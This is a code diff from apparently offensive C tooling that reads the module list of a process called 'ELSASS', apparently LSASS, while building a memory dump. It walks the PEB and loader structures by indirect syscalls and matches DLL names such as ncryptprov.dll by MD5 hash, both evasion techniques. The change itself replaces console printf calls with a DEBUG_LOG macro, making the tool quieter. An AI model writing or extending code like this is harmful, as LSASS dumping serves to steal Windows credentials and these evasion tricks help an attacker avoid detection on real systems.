@@ -21,7 +21,7 @@ BOOL read_ldr_entry(HANDLE hProcess, PVOID ldr_entry_address, struct CREDZ_LDR_D
         printf("[FAILURE] Reading LDR addrss failed\n");
         return (false);
     }
-    printf("[EXTRACTOR] Reading LDR address from memory success\n");
+    DEBUG_LOG("[EXTRACTOR] Reading LDR address from memory success\n");
 
     memset(base_dll_name, 0, MAX_PATH);
     IndirectSyscall(
@@ -38,7 +38,7 @@ BOOL read_ldr_entry(HANDLE hProcess, PVOID ldr_entry_address, struct CREDZ_LDR_D
         printf("[FAILURE] Reading LDR base name\n");
         return (false);
     }
-    printf("[EXTRACTOR] Reading LDR base name from memory success\n");
+    DEBUG_LOG("[EXTRACTOR] Reading LDR base name from memory success\n");
 
     return (true);
 }
@@ -62,7 +62,7 @@ PVOID get_peb_address(HANDLE hProcess)
     if (!NT_SUCCESS(status))
         return (0);
 
-    printf("[EXTRACTOR] PEB is at: 0x%px\n", basic_info.PebBaseAddress);
+    DEBUG_LOG("[EXTRACTOR] PEB is at: 0x%px\n", basic_info.PebBaseAddress);
     return (basic_info.PebBaseAddress);
 }
 
@@ -88,12 +88,12 @@ PVOID get_module_list_address(IN HANDLE hProcess)
         NULL
     );
 
-    printf("[EXTRACTOR] Reading LDR pointer from virtual memory, status = %d, ldr_address is now: 0x%p\n", status, ldr_address);
+    DEBUG_LOG("[EXTRACTOR] Reading LDR pointer from virtual memory, status = %d, ldr_address is now: 0x%p\n", status, ldr_address);
     if (!NT_SUCCESS(status)) {
         printf("[FAILURE] Reading LDR pointer failed\n");
         return (NULL);
     }
-    printf("[EXTRACTOR] Call success !\n");
+    DEBUG_LOG("[EXTRACTOR] Call success !\n");
 
     ldr_entry_address = NULL;
     module_list_pointer = RVA(PVOID, ldr_address, MODULE_LIST_POINTER_OFFSET);
@@ -107,13 +107,13 @@ PVOID get_module_list_address(IN HANDLE hProcess)
         sizeof(PVOID),
         NULL
     );
-    printf("[EXTRACTOR] Reading modules head pointer from virtual memory, status = %d, entry address is now: 0x%p\n", status, ldr_entry_address);
+    DEBUG_LOG("[EXTRACTOR] Reading modules head pointer from virtual memory, status = %d, entry address is now: 0x%p\n", status, ldr_entry_address);
     if (!NT_SUCCESS(status)) {
-        printf("[EXTRACTOR] Reading modules head pointer failed\n");
+        DEBUG_LOG("[EXTRACTOR] Reading modules head pointer failed\n");
         return (NULL);
     }
 
-    printf("[EXTRACTOR] Module list address parsed: 0x%p\n", ldr_entry_address);
+    DEBUG_LOG("[EXTRACTOR] Module list address parsed: 0x%p\n", ldr_entry_address);
     return (ldr_entry_address);
 }
 
@@ -143,7 +143,7 @@ PMODULEINFO add_new_module(IN HANDLE hProcess, IN struct CREDZ_LDR_DATA_TABLE_EN
         name_size,
         NULL
     );
-    printf("[EXTRACTOR] New module: %S successfully parsed and integrated into dump\n", new_module->dll_name);
+    DEBUG_LOG("[EXTRACTOR] New module: %S successfully parsed and integrated into dump\n", new_module->dll_name);
     return new_module;
 }
 
@@ -162,7 +162,7 @@ PMODULEINFO find_modules(HANDLE hProcess, const char* importantHashes[], int imp
     first_ldr_entry_address = NULL;
     while (dlls_found < importantHashesCount)
     {
-        printf("[EXTRACTOR] Looping over modules\n");
+        DEBUG_LOG("[EXTRACTOR] Looping over modules\n");
         BOOL success = read_ldr_entry(hProcess, ldr_entry_address, &ldr_entry, base_dll_name);
         if (!success)
             return NULL;
@@ -174,7 +174,7 @@ PMODULEINFO find_modules(HANDLE hProcess, const char* importantHashes[], int imp
             char* dllHash = drunk_md5(drunk_wchar_to_cstring(base_dll_name));
             if (drunk_strcmp(importantHashes[i], dllHash) == 0)
             {
-                printf("[EXTRACTOR] Module %ls (hash: %s) discovered at 0x%p\n", base_dll_name, dllHash, ldr_entry_address);
+                DEBUG_LOG("[EXTRACTOR] Module %ls (hash: %s) discovered at 0x%p\n", base_dll_name, dllHash, ldr_entry_address);
                 PMODULEINFO new_module = add_new_module(hProcess, &ldr_entry);
                 if (!new_module)
                     return NULL;
@@ -223,14 +223,14 @@ PMODULEINFO ELSASS_ExtractModulesList(PDUMPCONTEXT dc)
         "1dfcb83120acae27bd4722f126ddc1a5"  //ncryptprov.dll
     };
 
-    printf("[EXTRACTOR] Starting dump of modules list header\n");
+    DEBUG_LOG("[EXTRACTOR] Starting dump of modules list header\n");
     module_list = find_modules(dc->hProcess, importantHashes, ARRAY_SIZE(importantHashes));
     if (!module_list)
     {
         printf("[FAILURE] Failed to write the ModuleListStream\n");
         return (NULL);
     }
-    printf("[EXTRACTOR] Dumping modules success !\n");
+    DEBUG_LOG("[EXTRACTOR] Dumping modules success !\n");
 
     curr_module = module_list;
     number_of_modules = 0;
